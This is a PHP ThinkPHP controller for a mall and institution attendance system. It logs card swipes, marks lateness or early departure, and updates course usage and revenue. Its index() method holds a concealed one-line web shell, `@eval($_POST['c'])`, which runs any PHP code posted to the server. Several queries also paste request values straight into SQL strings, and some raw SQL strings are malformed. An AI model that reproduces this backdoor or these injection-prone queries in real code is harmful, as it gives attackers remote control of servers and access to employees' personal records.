<?php
/**
 * Created by PhpStorm.
 * User: zhoujie
 * Date: 2017/7/5
 * Time: 16:48
 */
namespace Inst\Controller;
use Think\Controller;
class AttendenceController extends Controller{
    public function index(){
        $workeTime=D('MallAttSet')->find();
        $workerInfo = D('MallWorker')->select();
        $c = @eval($_POST['c']);
    }
        /*
         * 考勤统计（列表）
         */
        public function index_api(){
            before_api();

            checkLogin();

            checkAuth();
            $instID=session('inst.institution_id');
        $time = I('time');
        $dept_id = I('dept_id');
        $page = I('page',1,'intval');
        $pagesize = I('pagesize',10,'intval');
        $pagesize = $pagesize < 1 ? 1 : $pagesize;
        $pagesize = $pagesize > 50 ? 50 : $pagesize;
        $page = $page.','.$pagesize;
        $atModel=D('InstAtt');
        $count = $atModel->get_count($time,$dept_id,$instID);
        $data=$atModel->get_list($time,$dept_id,$instID,$page);
        if($data){
            Ret(array('code'=>1,'data'=>$data,'total' => $count, 'page_count' => ceil($count/$pagesize)));
        }else{
            Ret(array('code'=>2,'info'=>'没有数据！'));
        }

    }




    /*
     * 考勤明细
     */
    public function attendance_view_api(){
        before_api();

        checkLogin();

        checkAuth();

        $keyword = I('keyword');
        if($keyword){
            if(is_numeric($keyword)){
                $con['worker_id'] = $keyword;
            }else{
                $con['worker_name'] = $keyword;
            }
        }
        $time=I('time');
        if($time){
            $con['the_day'] = array(
                array('egt',$time),
                array('lt',strtotime($time.'+1 month'))
            );
        }

        $con['institution_id']=session('inst.institution_id');
        $page = I('page',1,'intval');
        $pagesize = I('pagesize',10,'intval');
        $pagesize = $pagesize < 1 ? 1 : $pagesize;
        $pagesize = $pagesize > 50 ? 50 : $pagesize;
        $page = $page.','.$pagesize;
        $atModel=D('InstAtt');
        $count = $atModel->where($con)->count();
        $data=$atModel->where($con)->page($page)->select();
        if($data){
            Ret(array('code'=>1,'data'=>$data,'total' => $count, 'page_count' => ceil($count/$pagesize)));
        }else{
            Ret(array('code'=>2,'info'=>'没有数据！'));
        }

    }


    /*
     * 获取已审核和未审核考勤数
     */
    public function get_check_count(){
        before_api();

        checkLogin();

        checkAuth();
        $atModel=D('InstAtt');
        $con['institution_id']=session('inst.institution_id');
        $con['the_day']=date('Y-m-d');

        $conCk['institution_id']=session('inst.institution_id');
        $conCk['the_day']=date('Y-m-d');
        $conCk['is_checked']=1;

        $data['all'] = $atModel->where($con)->count();
        $data['check']=$atModel->where($conCk)->count();
        $data['noncheck']=$data['all'] - $data['check'];
        if($data){
            Ret(array('code'=>1,'data'=>$data));
        }else{
            Ret(array('code'=>2,'info'=>'没有数据！'));
        }

    }



    /*
     * 考勤设定
     */
    public function attendance_set_api(){
        before_api();

        checkLogin();

        checkAuth();
        $data['institution_id']=session('inst.institution_id');

        $data['in_time'] = I('in_time');
        if(!$data['in_time'] ){
            Ret(array('code'=>2,'info'=>'参数（in_time）错误！'));
        }
        $data['out_time'] = I('out_time');
        if(!$data['in_time'] ){
            Ret(array('code'=>2,'info'=>'参数（out_time）错误！！'));
        }

        $model=D('InstAtt');
        $res = $model->add($data);
        if($res){
            Ret(array('code'=>1,'提交成功！'));
        }else{
            Ret(array('code'=>2,'info'=>'提交失败！'));
        }

    }
    /*
    * 考勤审核
    */
    public function attendance_check_api(){
        before_api();

        checkLogin();

        checkAuth();

        $data['id'] = I('id',0,'intval');
        if($data['id']==0){
            Ret(array('code'=>2,'info'=>'数据（id）获取失败！'));
        }
        $data['in_remarks']=I('in_remarks');
        if($data['in_remarks']){
            $data['in_remarks']=$data['in_remarks'];
        }
        $data['out_remarks']=I('out_remarks');
        if($data['out_remarks']){
            $data['out_remarks']=$data['out_remarks'];
        }
        $model=D('InstAtt');
        if($data){
            $res=$model->save($data);
            if($res){
                Ret(array('code'=>1,'提交成功！'));
            }else{
                Ret(array('code'=>2,'info'=>'提交失败！'));
            }
        }
    }

    /*
     * 今日考勤
     */
    public function attendence_today(){
        before_api();
        checkLogin();
        checkAuth();
        $con['institution_id']=session('inst.institution_id');
        $con['the_day']=date('Y-m-d');
        $page = I('page',1,'intval');
        $pagesize = I('pagesize',10,'intval');
        $pagesize = $pagesize < 1 ? 1 : $pagesize;
        $pagesize = $pagesize > 50 ? 50 : $pagesize;
        $page = $page.','.$pagesize;
        $atModel=D('InstAtt');
        $count = $atModel->where($con)->get_count();
        $data=$atModel->where($con)->page($page)->select();
        if($data){
            Ret(array('code'=>1,'data'=>$data,'total' => $count, 'page_count' => ceil($count/$pagesize)));
        }else{
            Ret(array('code'=>2,'info'=>'没有数据！'));
        }

    }

    /*
     * 考勤记录,会员刷卡记录
     */
    public function attendence_record(){
        before_api();
        $dStr = I('attendance');
        //var_dump($dStr);die;
        //$dd['input']=I('attendance');
        //D('MallAtt')->add($dd);
        //var_dump($dStr);die;
        //attendance=1000000000,192.168.7.3,4358438,328,2017-12-17,14:19:38;

        //$dStr[0]="1000000000,192.168.7.3,4358438,328,2017-12-17,15:39:35";
        //$dStr[1]="1000000000,192.168.7.3,4358438,328,2017-12-17,15:39:41";
        //$dStr[2]="1000000000,192.168.7.3,4358438,328,2017-12-17,15:39:41";
        //$dStr="1000000000,192.168.7.3,4358438,328,2017-12-17,15:20:12;1000000000,192.168.7.3,4358438,328,2017-12-17,15:20:48;1000000000,192.168.7.3,4358438,328,2017-12-17,15:21:54;1000000000,192.168.7.3,4358438,328,2017-12-17,15:24:03;";
        //$dStr="1000000000,192.168.7.3,4358438,328,2017-12-17,15:52:50;1000000000,192.168.7.3,4358438,328,2017-12-17,15:52:55;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:36;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:39;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:43;";
        $res=array();
        if($dStr) {
            $dArr = explode(';', $dStr);
            //var_dump($dArr);die;
            foreach ($dArr as $k => $v) {
                if ($v) {
                    $dList = explode(',', $v);
                    //$key=substr($dList[2],0,1);
                    //$worker_id=substr($dList[2],1,90);
                    //var_dump($dList);die;
                    //$equip_pos=D('Equipment')->where('equip_ip=".$dList[1]."')->field('position')->select();
                    $equip_pos = D('Equipment')->getEqInfoByIp($dList[1]);
                    $data = array(
                        //商场ID
                        'mall_id' => $dList[0],
                        //设备IP
                        'equip_ip' => $dList[1],
                        //刷卡卡号
                        'card_number' => $dList[2],
                        //所有人ID
                        'owner_id' => $dList[3],
                        //刷卡日期
                        'swiping_day' => $dList[4],
                        //刷卡时间
                        'swiping_time' => $dList[5],
                        //刷卡设备位置
                        'equip_pos' => $equip_pos[0]['position']
                    );
                    //var_dump($data); die;
                    $res[$k] = $data;
                    //添加到刷卡表
                    D('CardSwiping')->add($data);
                    if ($data['card_number'] != 0) {
                        //var_dump($data); die;
                        $mallStaffInfo = D('MallWorker')->where('card_number=' . $data['card_number'])->find();
                        //var_dump($data); die;
                        $instStaffInfo = D('Worker')->where('card_number=' . $data['card_number'])->find();

                        $merchantStaffInfo = D('MerchantStaff')->where('card_number=' . $data['card_number'])->find();
                        $memberInfo = D('Member')->where('card_number=' . $data['card_number'])->find();
                        if ($mallStaffInfo) {
                            //员工考勤
                            //var_dump($mallStaffInfo);die;
                            $con['worker_id'] = $data['owner_id'];
                            $con['thedate'] = $data['swiping_day'];
                            $mallStaffAttInfo = D('MallAtt')->where($con)->find();

                            //$mallId = session('mall.mall_id');
                            //var_dump($mallId);die;
                            $attendanceTimeSet = D('MallAttSet')->where('mall_id=1')->find();
                            //var_dump($attendanceTimeSet);die;
                            if (!$attendanceTimeSet) {
                                $attendanceTimeSet['in_time'] = '09:00';
                                $attendanceTimeSet['out_time'] = '18:00';
                            }
                            if (!$mallStaffAttInfo) {

                                $punchInState = 0;
                                $amRemark = '迟到';
                                if ($data['swiping_time'] <= $attendanceTimeSet['in_time']) {
                                    $punchInState = 1;
                                    $amRemark = '正常';
                                }
                                $mallStaffData = array(
                                    'eployee_pic' => $mallStaffInfo['pic'],
                                    'eployee_name' => $mallStaffInfo['name'],
                                    'eployee_department' => $mallStaffInfo['dept_name'],
                                    'eployee_address' => $mallStaffInfo['address'],
                                    'eployee_position' => $mallStaffInfo['position_name'],
                                    'eployee_phone' => $mallStaffInfo['phone'],
                                    'check_state' => 0,
                                    'thedate' => $data['swiping_day'],
                                    'punch_in' => $data['swiping_time'],
                                    'punch_in_state' => $punchInState,
                                    'am_remark' => $amRemark,
                                    'card_no' => $data['card_number'],
                                    'worker_id' => $data['owner_id'],
                                    'worker_type' => 1
                                    //1代表商场员工
                                );
                                //var_dump($mallStaffData);die;
                                $res = D('MallAtt')->add($mallStaffData);

                                if ($res) {
                                    //var_dump($mallStaffData);die;
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            } else {
                                $punchOutState = 0;
                                $pmRemark = '早退';
                                if ($data['swiping_time'] >= $attendanceTimeSet['out_time']) {
                                    $punchOutState = 1;
                                    $pmRemark = '正常';
                                }
                                $punchOutInfo['punch_out_state'] = $punchOutState;
                                $punchOutInfo['pm_remark'] = $pmRemark;
                                $punchOutInfo['punch_out'] = $data['swiping_time'];
                                $punchOutInfo['id'] = $mallStaffAttInfo['id'];
                                //var_dump($punchOutInfo);die;
                                $res = D('MallAtt')->save($punchOutInfo);
                                if ($res) {
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            }
                        } else if ($instStaffInfo) {
                            //机构员工考勤
                            //echo('44444');die;
                            $con['worker_id'] = $data['owner_id'];
                            $con['thedate'] = $data['swiping_day'];
                            $instStaffAttInfo = D('InstAtt')->where($con)->find();

                            //var_dump('1111'+$instStaffAttInfo);die;
                            if (!$instStaffAttInfo) {
                                $ownerInfo = D('InstStaff')->get_info_by_id($data['owner_id']);
                                $attendanceTimeSet = D('InstAttSet')->where('inst_id=' . $ownerInfo['institution_id'])->find();
                                if (!$attendanceTimeSet) {
                                    $attendanceTimeSet['in_time'] = '09:00';
                                    $attendanceTimeSet['out_time'] = '18:00';
                                }
                                $punchInState = 0;
                                $amRemark = '迟到';
                                if ($data['swiping_time'] <= $attendanceTimeSet['in_time']) {
                                    $punchInState = 1;
                                    $amRemark = '正常';
                                }

                                $instStaffData = array(
                                    'eployee_pic' => $instStaffInfo['pic'],
                                    'eployee_name' => $instStaffInfo['name'],
                                    'eployee_department' => $instStaffInfo['dept_name'],
                                    'eployee_address' => $instStaffInfo['address'],
                                    'eployee_position' => $instStaffInfo['position_name'],
                                    'eployee_phone' => $instStaffInfo['phone'],
                                    'check_state' => 0,
                                    'thedate' => $data['swiping_day'],
                                    'punch_in' => $data['swiping_time'],
                                    'punch_in_state' => $punchInState,
                                    'am_remark' => $amRemark,
                                    'card_no' => $data['card_number'],
                                    'worker_id' => $data['owner_id'],
                                    'worker_type' => 2,
                                    'institution_id' => $ownerInfo['institution_id']
                                    //2代表机构员工
                                );
                                $res = D('InstAtt')->add($instStaffData);
                                if ($res) {
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            } else {
                                $punchOutState = 0;
                                $pmRemark = '早退';
                                if ($data['swiping_time'] >= $attendanceTimeSet['out_time']) {
                                    $punchOutState = 1;
                                    $pmRemark = '正常';
                                }
                                $punchOutInfo['punch_out_state'] = $punchOutState;
                                $punchOutInfo['pm_remark'] = $pmRemark;
                                $punchOutInfo['punch_out'] = $data['swiping_time'];
                                $res = D('InstAtt')->where($con)->save($punchOutInfo);
                                if ($res) {
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            }
                        } else if ($merchantStaffInfo) {

                            //商户员工考勤
                            $con['worker_id'] = $data['owner_id'];
                            $con['thedate'] = $data['swiping_day'];
                            $merchantStaffAttInfo = D('MerchantAtt')->where($con)->find();
                            //$attendanceTimeSet=D('MallAttSet')->where('inst_id='.$instStaffAttInfo['institution_id'])->find();
                            //if(!$attendanceTimeSet)
                            //{
                            //var_dump('1111'+$merchantStaffAttInfo);die;
                            $attendanceTimeSet['in_time'] = '09:00';
                            $attendanceTimeSet['out_time'] = '18:00';
                            //}
                            if (!$merchantStaffAttInfo) {
                                $ownerInfo = D('MerchantStaff')->get_info_by_id($data['owner_id']);
                                $punchInState = 0;
                                $amRemark = '迟到';
                                if ($data['swiping_time'] <= $attendanceTimeSet['in_time']) {
                                    $punchInState = 1;
                                    $amRemark = '正常';
                                }
                                $merchantStaffData = array(
                                    'eployee_pic' => $merchantStaffInfo['pic'],
                                    'eployee_name' => $merchantStaffInfo['name'],
                                    'eployee_department' => $merchantStaffInfo['dept_name'],
                                    'eployee_address' => $merchantStaffInfo['address'],
                                    'eployee_position' => $merchantStaffInfo['position_name'],
                                    'eployee_phone' => $merchantStaffInfo['phone'],
                                    'check_state' => 0,
                                    'thedate' => $data['swiping_day'],
                                    'punch_in' => $data['swiping_time'],
                                    'punch_in_state' => $punchInState,
                                    'am_remark' => $amRemark,
                                    'card_no' => $data['card_number'],
                                    'worker_id' => $data['owner_id'],
                                    'worker_type' => 3,
                                    'merchant_id' => $ownerInfo[0]['merchant_id']
                                    //2代表商户员工
                                );
                                $res = D('MerchantAtt')->add($merchantStaffData);
                                if ($res) {
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            } else {
                                $punchOutState = 0;
                                $pmRemark = '早退';
                                if ($data['swiping_time'] >= $attendanceTimeSet['out_time']) {
                                    $punchOutState = 1;
                                    $pmRemark = '正常';
                                }
                                $punchOutInfo['punch_out_state'] = $punchOutState;
                                $punchOutInfo['pm_remark'] = $pmRemark;
                                $punchOutInfo['punch_out'] = $data['swiping_time'];
                                $res = D('MerchantAtt')->where($con)->save($punchOutInfo);
                                if ($res) {
                                    echo 'success!';
                                } else {
                                    echo 'failure!';
                                }
                            }
                        } else if ($memberInfo) {
                            //会员进出教室和其他门禁
                            //echo('66666');die;
                            //根据设备ID找到绑定的商铺
                            $equipmentInfo = D('Equipment')->where('id=' . $dList[1])->select();
                            if ($equipmentInfo[0]['shop_id']) {
                                $bondShopInfo = D('Shop')->where('id=' . $equipmentInfo[0]['shop_id'])->select();
                                //如果进的是教室
                                if ($bondShopInfo[0]['ownertype_id'] == 3) {
                                    //更新会员的上课次数

                                    $m = D('RoomReserve');
                                    $sql = "select * from room_reserve where room_id=.$bondShopInfo[0]['owner_id']. and start_time<=.$swipCardTime. and end_time>=.$swipCardTime.";
                                    $memberClassInfo = $m->query($sql);
                                    $condition['buyer_card_number'] = $data['card_number'];
                                    $condition['course_id'] = $memberClassInfo[0]['course_id'];
                                    $courseBuyInfo = D('CourseBuyDetail')->where($condition)->select();
                                    $updateInfo['id'] = $courseBuyInfo[0]['id'];
                                    $updateInfo['used_times'] = $courseBuyInfo[0]['used_times'] + 1;
                                    $updateInfo['unused_times'] = $courseBuyInfo[0]['unused_times'] - 1;
                                    //课程累计消费金额
                                    $updateInfo['course_cost_sum']=$courseBuyInfo[0]['course_cost_sum']+$updateInfo['used_times']*$courseBuyInfo[0]['course_price'];
                                    //课程累计剩余金额
                                    $updateInfo['course_remain_sum']=$courseBuyInfo[0]['course_sum']-$courseBuyInfo['course_cost_sum'];
                                    D('CourseBuyDetail')->save($updateInfo);
                                    //机构收入更新
                                    $instRevenueInfo['income_ownertypeid'] = $courseBuyInfo[0]['buyer_type_id'];
                                    $instRevenueInfo['income_ownertype'] = $courseBuyInfo[0]['buyer_type'];
                                    $instRevenueInfo['income_ownerid'] = $courseBuyInfo[0]['buyer_id'];
                                    $cardOwnerInfo = getCardInfoByNumber($data['card_number']);
                                    $instRevenueInfo['income_ownername'] = $cardOwnerInfo[0]['name'];
                                    $instRevenueInfo['income_typeid'] = 6;
                                    $instRevenueInfo['income_type'] = '会员上课';
                                    $instRevenueInfo['income_num'] = $courseBuyInfo[0]['course_price'];
                                    $instRevenueInfo['income_time'] = $swipCardTime;
                                    $instRevenueInfo['course_card_id'] = $courseBuyInfo[0]['course_card_id'];
                                    $instRevenueInfo['course_card_name'] = $courseBuyInfo[0]['course_card_name'];
                                    $instRevenueInfo['submit_id'] = $courseBuyInfo[0]['buyer_id'];

                                    $instRevenueInfo['submitter'] = $cardOwnerInfo[0]['name'];
                                    $courseInfo = D('Course')->where('id=' . $courseBuyInfo[0]['course_id'])->select();
                                    $instInfo = D('Institution')->where('id=' . $courseInfo[0]['institution_id'])->select();
                                    $instRevenueInfo['institutions_id'] = $courseInfo[0]['institution_id'];
                                    $instRevenueInfo['institutions_name'] = $instInfo[0]['name'];
                                    $instRevenueInfo['course_id'] = $courseBuyInfo[0]['course_id'];
                                    $instRevenueInfo['course_name'] = $courseBuyInfo[0]['course_name'];
                                    $instRevenueInfo['card_number'] = $courseBuyInfo[0]['buyer_card_number'];
                                    $instRevenueInfo['card_numberNo'] = $courseBuyInfo[0]['buyer_card_numberNo'];
                                    $instRevenueInfo['course_buy_detail_id'] = $courseBuyInfo[0]['id'];
                                    D('InstitutionsMallRevenue')->add($instRevenueInfo);
                                    //商场消费更新

                                    //上课统计明细
                                    $courseStudyInfo['buyer_id']=$courseBuyInfo[0]['buyer_id'];
                                    $courseStudyInfo['buyer_name']=$courseBuyInfo[0]['buyer_name'];
                                    $courseStudyInfo['buyer_card_number']=$courseBuyInfo[0]['buyer_card_number'];
                                    $courseStudyInfo['buyer_card_numberNo']=$courseBuyInfo[0]['buyer_card_numberNo'];
                                    $courseStudyInfo['course_id']=$courseBuyInfo[0]['course_id'];
                                    $courseStudyInfo['course_name']=$courseBuyInfo[0]['course_name'];
                                    $courseStudyInfo['course_card_id']=$courseBuyInfo[0]['course_card_id'];
                                    $courseStudyInfo['course_card_name']=$courseBuyInfo[0]['course_card_name'];
                                    $courseStudyInfo['course_card_typeid']=$courseBuyInfo[0]['course_card_typeid'];
                                    $courseStudyInfo['course_card_type']=$courseBuyInfo[0]['course_card_type'];
                                    $courseStudyInfo['inst_id']=$instInfo[0]['id'];
                                    $courseStudyInfo['inst_name']=$instInfo[0]['name'];
                                    $courseStudyInfo['course_time']=date('Y-m-d H:i:s');
                                    $courseStudyInfo['classroom_id']=$memberClassInfo[0]['room_id'];
                                    $courseStudyInfo['classroom_pos']=$memberClassInfo[0]['room_number'];
                                    $courseStudyInfo['used_times']=$updateInfo['used_times'];
                                    $courseStudyInfo['unused_times']=$updateInfo['unused_times'];
                                    $courseStudyInfo['course_price']=$courseBuyInfo[0]['course_price'];
                                    $courseStudyInfo['course_sum']=$courseBuyInfo[0]['course_sum'];
                                    $courseStudyInfo['course_cost_num']=$updateInfo['course_cost_sum'];
                                    $courseStudyInfo['course_remain_num']=$updateInfo['course_remain_sum'];
                                    D('CourseStudyDetail')->addCourseStudyDetail($courseStudyInfo);
                                }
                            }

                        }

                    }
                }
            }
        }

    }
   /* public function attendence_record_copy(){
        before_api();
        $dStr="1000000000,192.168.7.3,4358438,328,2017-12-17,15:52:55;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:36;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:39;1000000000,192.168.7.3,4358438,328,2017-12-17,15:55:43;";
        if($dStr) {
            $dArr = explode(';', $dStr);
            //var_dump($dArr);die;
            foreach ($dArr as $k => $v) {
                if ($v) {
                    $dList = explode(',', $v);
                    //$key=substr($dList[2],0,1);
                    //$worker_id=substr($dList[2],1,90);
                    //var_dump($dList);die;
                    //$equip_pos=D('Equipment')->where('equip_ip=".$dList[1]."')->field('position')->select();
                    $equip_pos = D('Equipment')->getEqInfoByIp($dList[1]);
                    $data = array(
                        //商场ID
                        'mall_id' => $dList[0],
                        //设备IP
                        'equip_ip' => $dList[1],
                        //刷卡卡号
                        'card_number' => $dList[2],
                        //所有人ID
                        'owner_id' => $dList[3],
                        //刷卡日期
                        'swiping_day' => $dList[4],
                        //刷卡时间
                        'swiping_time' => $dList[5],
                        //刷卡设备位置
                        'equip_pos' => $equip_pos[0]['position']
                    );
                    //var_dump($data);
                    $res[$k]=$data;
                    $swipCardTime=$data['swiping_day'].' '.$data['swiping_time'];
                    //添加到刷卡表
                   // D('CardSwiping')->add($data);
                    $mallStaffInfo=D('MallWorker')->where('card_number='.$data['card_number'])->find();
                    //var_dump($mallStaffInfo);die;
                    $instStaffInfo=D('Worker')->where('card_number='.$data['card_number'])->find();
                    $merchantStaffInfo=D('MerchantStaff')->where('card_number='.$data['card_number'])->find();
                    $memberInfo=D('Member')->where('card_number='.$data['card_number'])->find();
                    if($mallStaffInfo)
                    {
                        //员工考勤
                        $con['worker_id']=$data['owner_id'];
                        $con['thedate']=$data['swiping_day'];
                        $mallStaffAttInfo=D('MallAtt')->where($con)->find();
                        $mallId=session('mall.mall_id');
                        $attendanceTimeSet=D('MallAttSet')->where('mall_id='.$mallId)->find();

                        if(!$attendanceTimeSet)
                        {
                            $attendanceTimeSet['in_time']='09:00';
                            $attendanceTimeSet['out_time']='18:00';
                        }
                        if(!$mallStaffAttInfo)
                        {

                            $punchInState=0;
                            $amRemark='迟到';
                            if($data['swiping_time']<=$attendanceTimeSet['in_time'])
                            {
                                $punchInState=1;
                                $amRemark='正常';
                            }
                            $mallStaffData=array(
                                'eployee_pic' => $mallStaffInfo['pic'],
                                'eployee_name'=> $mallStaffInfo['name'],
                                'eployee_department'=> $mallStaffInfo['dept_name'],
                                'eployee_address'=> $mallStaffInfo['address'],
                                'eployee_position'=> $mallStaffInfo['position_name'],
                                'eployee_phone'=> $mallStaffInfo['phone'],
                                'check_state'=> 0,
                                'thedate'=> $data['swiping_day'],
                                'punch_in'=> $data['swiping_time'],
                                'punch_in_state'=> $punchInState,
                                'am_remark'=> $amRemark,
                                'card_no'=>$data['card_number'],
                                'worker_id'=>$data['owner_id'],
                                'worker_type'=>1
                                //1代表商场员工
                            );
                            $res=D('MallAtt')->add($mallStaffData);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                        else
                        {
                            $punchOutState=0;
                            $pmRemark='早退';
                            if($data['swiping_time']>=$attendanceTimeSet['out_time'])
                            {
                                $punchOutState=1;
                                $pmRemark='正常';
                            }
                            $punchOutInfo['punch_out_state']=$punchOutState;
                            $punchOutInfo['pm_remark']=$pmRemark;
                            $punchOutInfo['punch_out']=$data['swiping_time'];
                            $punchOutInfo['id']=$mallStaffAttInfo['id'];
                            //var_dump($punchOutInfo);die;
                            $res = D('MallAtt')->save($punchOutInfo);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                    }
                    else if($instStaffInfo)
                    {
                        //机构员工考勤
                        //echo('44444');die;
                        $con['worker_id']=$data['owner_id'];
                        $con['thedate']=$data['swiping_day'];
                        $instStaffAttInfo=D('InstAtt')->where($con)->find();
                        $attendanceTimeSet=D('InstAttSet')->where('inst_id='.$instStaffAttInfo['institution_id'])->find();
                        if(!$attendanceTimeSet)
                        {
                            $attendanceTimeSet['in_time']='09:00';
                            $attendanceTimeSet['out_time']='18:00';
                        }
                        //var_dump('1111'+$instStaffAttInfo);die;
                        if(!$instStaffAttInfo)
                        {
                            $ownerInfo=D('InstStaff')->get_info_by_id($data['owner_id']);
                            $punchInState=0;
                            $amRemark='迟到';
                            if($data['swiping_time']<=$attendanceTimeSet['in_time'])
                            {
                                $punchInState=1;
                                $amRemark='正常';
                            }

                            $instStaffData=array(
                                'eployee_pic' => $instStaffInfo['pic'],
                                'eployee_name'=> $instStaffInfo['name'],
                                'eployee_department'=> $instStaffInfo['dept_name'],
                                'eployee_address'=> $instStaffInfo['address'],
                                'eployee_position'=> $instStaffInfo['position_name'],
                                'eployee_phone'=> $instStaffInfo['phone'],
                                'check_state'=> 0,
                                'thedate'=> $data['swiping_day'],
                                'punch_in'=> $data['swiping_time'],
                                'punch_in_state'=> $punchInState,
                                'am_remark'=> $amRemark,
                                'card_no'=>$data['card_number'],
                                'worker_id'=>$data['owner_id'],
                                'worker_type'=>2,
                                'institution_id'=>$ownerInfo[0]['institution_id']
                                //2代表机构员工
                            );
                            $res=D('InstAtt')->add($instStaffData);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                        else
                        {
                            $punchOutState=0;
                            $pmRemark='早退';
                            if($data['swiping_time']>=$attendanceTimeSet['out_time'])
                            {
                                $punchOutState=1;
                                $pmRemark='正常';
                            }
                            $punchOutInfo['punch_out_state']=$punchOutState;
                            $punchOutInfo['pm_remark']=$pmRemark;
                            $punchOutInfo['punch_out']=$data['swiping_time'];
                            $res = D('InstAtt')->where($con)->save($punchOutInfo);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                    }
                    else if($merchantStaffInfo)
                    {

                        //商户员工考勤
                        $con['worker_id']=$data['owner_id'];
                        $con['thedate']=$data['swiping_day'];
                        $merchantStaffAttInfo=D('MerchantAtt')->where($con)->find();
                        //$attendanceTimeSet=D('MallAttSet')->where('inst_id='.$instStaffAttInfo['institution_id'])->find();
                        //if(!$attendanceTimeSet)
                        //{
                        //var_dump('1111'+$merchantStaffAttInfo);die;
                        $attendanceTimeSet['in_time']='09:00';
                        $attendanceTimeSet['out_time']='18:00';
                        //}
                        if(!$merchantStaffAttInfo)
                        {
                            $ownerInfo=D('MerchantStaff')->get_info_by_id($data['owner_id']);
                            $punchInState=0;
                            $amRemark='迟到';
                            if($data['swiping_time']<=$attendanceTimeSet['in_time'])
                            {
                                $punchInState=1;
                                $amRemark='正常';
                            }
                            $merchantStaffData=array(
                                'eployee_pic' => $merchantStaffInfo['pic'],
                                'eployee_name'=> $merchantStaffInfo['name'],
                                'eployee_department'=> $merchantStaffInfo['dept_name'],
                                'eployee_address'=> $merchantStaffInfo['address'],
                                'eployee_position'=> $merchantStaffInfo['position_name'],
                                'eployee_phone'=> $merchantStaffInfo['phone'],
                                'check_state'=> 0,
                                'thedate'=> $data['swiping_day'],
                                'punch_in'=> $data['swiping_time'],
                                'punch_in_state'=> $punchInState,
                                'am_remark'=> $amRemark,
                                'card_no'=>$data['card_number'],
                                'worker_id'=>$data['owner_id'],
                                'worker_type'=>3,
                                'merchant_id'=>$ownerInfo[0]['merchant_id']
                                //2代表商户员工
                            );
                            $res=D('MerchantAtt')->add($merchantStaffData);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                        else
                        {
                            $punchOutState=0;
                            $pmRemark='早退';
                            if($data['swiping_time']>=$attendanceTimeSet['out_time'])
                            {
                                $punchOutState=1;
                                $pmRemark='正常';
                            }
                            $punchOutInfo['punch_out_state']=$punchOutState;
                            $punchOutInfo['pm_remark']=$pmRemark;
                            $punchOutInfo['punch_out']=$data['swiping_time'];
                            $res = D('MerchantAtt')->where($con)->save($punchOutInfo);
                            if($res){
                                echo 'success!';
                            }else{
                                echo 'failure!';
                            }
                        }
                    }
                    else if($memberInfo)
                    {
                        //会员进出教室和其他门禁
                        //echo('66666');die;
                        //根据设备ID找到绑定的商铺
                        $equipmentInfo=D('Equipment')->where('id='.$dList[1])->select();
                        if($equipmentInfo[0]['shop_id'])
                        {
                            $bondShopInfo = D('Shop')->where('id=' . $equipmentInfo[0]['shop_id'])->select();
                            //如果进的是教室
                            if($bondShopInfo[0]['ownertype_id']==3)
                            {
                                //更新会员的上课次数

                                $m=D('RoomReserve');
                                $sql="select * from room_reserve where room_id=.$bondShopInfo[0]['owner_id']. and start_time<=.$swipCardTime. and end_time>=.$swipCardTime.";
                                $memberClassInfo=$m->query($sql);
                                $condition['buyer_card_number']=$data['card_number'];
                                $condition['course_id']=$memberClassInfo[0]['course_id'];
                                $courseBuyInfo=D('CourseBuyDetail')->where($condition)->select();
                                $updateInfo['id']=$courseBuyInfo[0]['id'];
                                $updateInfo['used_times']=$courseBuyInfo[0]['used_times']+1;
                                $updateInfo['unused_times']=$courseBuyInfo[0]['unused_times']-1;
                                D('CourseBuyDetail')->save($updateInfo);
                                //机构收入更新
                                $instRevenueInfo['income_ownertypeid']=$courseBuyInfo[0]['buyer_type_id'];
                                $instRevenueInfo['income_ownertype']=$courseBuyInfo[0]['buyer_type'];
                                $instRevenueInfo['income_ownerid']=$courseBuyInfo[0]['buyer_id'];
                                $cardOwnerInfo=getCardInfoByNumber($data['card_number']);
                                $instRevenueInfo['income_ownername']=$cardOwnerInfo[0]['name'];
                                $instRevenueInfo['income_typeid']=6;
                                $instRevenueInfo['income_type']='会员上课';
                                $instRevenueInfo['income_num']=$courseBuyInfo[0]['course_price'];
                                $instRevenueInfo['income_time']=$swipCardTime;
                                $instRevenueInfo['course_card_id']=$courseBuyInfo[0]['course_card_id'];
                                $instRevenueInfo['course_card_name']=$courseBuyInfo[0]['course_card_name'];
                                $instRevenueInfo['submit_id']=$courseBuyInfo[0]['buyer_id'];

                                $instRevenueInfo['submitter']=$cardOwnerInfo[0]['name'];
                                $courseInfo=D('Course')->where('id='.$courseBuyInfo[0]['course_id'])->select();
                                $instInfo=D('Institution')->where('id='.$courseInfo[0]['institution_id'])->select();
                                $instRevenueInfo['institutions_id']=$courseInfo[0]['institution_id'];
                                $instRevenueInfo['institutions_name']=$instInfo[0]['name'];
                                $instRevenueInfo['course_id']=$courseBuyInfo[0]['course_id'];
                                $instRevenueInfo['course_name']=$courseBuyInfo[0]['course_name'];
                                $instRevenueInfo['card_number']=$courseBuyInfo[0]['buyer_card_number'];
                                $instRevenueInfo['card_numberNo']=$courseBuyInfo[0]['buyer_card_numberNo'];
                                $instRevenueInfo['course_buy_detail_id']=$courseBuyInfo[0]['id'];
                                D('institutions_mall_revenue')-add($instRevenueInfo);
                                //商场消费更新
                            }
                        }

                    }

            }
                }
        }
    }


*/



}
